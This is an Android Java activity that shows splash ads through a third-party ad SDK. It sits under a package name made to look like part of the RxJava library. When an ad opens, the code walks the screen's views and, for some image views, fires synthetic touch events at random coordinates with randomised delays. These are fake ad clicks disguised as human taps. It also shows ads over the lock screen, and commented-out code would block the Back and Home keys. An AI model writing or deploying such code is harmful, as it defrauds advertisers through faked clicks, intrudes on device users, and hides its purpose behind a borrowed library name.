package rxjava.reactivex.io.utils;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.os.SystemClock;
import android.support.annotation.NonNull;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.TextView;

import com.ssp.sdk.adInterface.SplashAdListener;
import com.ssp.sdk.platform.ui.PSplashAd;

import java.util.Random;

public class AdSplashActivity extends Activity implements SplashAdListener {
    private final static String TAG = "AdSplashActivity";
    private TextView skipTxt;
    private ImageView holderImg;
    private FrameLayout containerFL;
    private PermissionManagement permissionManagement = null;
    private boolean canJump = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED);
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_view);
        ActivityManager.addActivity(this);
        Log.e(TAG, "启动成功");
        holderImg = (ImageView) this.findViewById(R.id.holderImg);
        permissionManagement = new PermissionManagement(this);

        if (permissionManagement.isNeedRequestPermission()) {
            //需要申请权限
        } else {
            initSplashAd();
        }
    }

    private PSplashAd initSplashAd() {
        skipTxt = (TextView) this.findViewById(R.id.skipTxt);
        containerFL = (FrameLayout) this.findViewById(R.id.containerFL);
        String appId = "1547038362";
        String posId = "1547038383";
        return new PSplashAd(this, containerFL,
                appId,
                posId,
                skipTxt, this);
    }

    @Override
    public void onLoadFail(int code, String message) {
        Log.e(TAG, message);
        next();

    }

    @Override
    public void onLoadSuccess() {
        Log.e(TAG, "展示成功");
        holderImg.setVisibility(View.GONE);


    }

    private void simulateClick(View view, float x, float y) {
        long downTime = SystemClock.uptimeMillis();
        final MotionEvent downEvent = MotionEvent.obtain(downTime, downTime, MotionEvent.ACTION_DOWN, x, y, 0);
        downTime += new Random().nextInt(2000);
        final MotionEvent upEvent = MotionEvent.obtain(downTime, downTime, MotionEvent.ACTION_UP, x, y, 0);
        view.onTouchEvent(downEvent);
        view.onTouchEvent(upEvent);
        downEvent.recycle();
        upEvent.recycle();
    }


    @Override
    public void onAdOpen() {
        Log.v(TAG, "onAdOpen");


        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                final View view = getWindow().getDecorView();
                getChild(view);
            }
        }, 500);


    }


    public void getChild(final View view) {

        DisplayMetrics dm = getResources().getDisplayMetrics();
        final int heigth = dm.heightPixels;
        final int width = dm.widthPixels;

        if (view instanceof ViewGroup) {
            for (int i = 0; i < ((ViewGroup) view).getChildCount(); i++) {
                getChild(((ViewGroup) view).getChildAt(i));
            }
        } else {
            Log.e("AdSplashActivity", view.getClass().getName());
            if (view instanceof ImageView) {
                if ((int) (1 + Math.random() * 20) == 10) {

                    new Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            simulateClick(view, new Random().nextInt(width), new Random().nextInt(heigth));
                        }
                    }, 500 + new Random().nextInt(4000));
                }
            }

        }

    }

    @Override
    public void onAdClick() {
        Log.v(TAG, "onAdClick");

    }

    @Override
    public void onAdClose() {
        Log.v(TAG, "onAdDismissed");
        next();
    }

    @Override
    public void onAdCountdown(int remainingSeconds) {
        skipTxt.setText(String.format("点击跳过%s",
                String.valueOf(remainingSeconds)));
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (canJump) {
            next();
        }
        canJump = true;
    }

    private void next() {
        if (canJump) {
            this.finish();
        } else {
            canJump = true;
        }
    }


    @Override
    protected void onRestart() {
        super.onRestart();
    }

    @Override
    protected void onPause() {
        super.onPause();
        canJump = false;
    }

//    @Override
//    public boolean onKeyDown(int keyCode, KeyEvent event) {
//        if (keyCode == KeyEvent.KEYCODE_BACK ||
//                keyCode == KeyEvent.KEYCODE_HOME) {
//            return true;
//        }
//        return super.onKeyDown(keyCode, event);
//    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        initSplashAd();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        ActivityManager.removeActivity(this);
    }
}
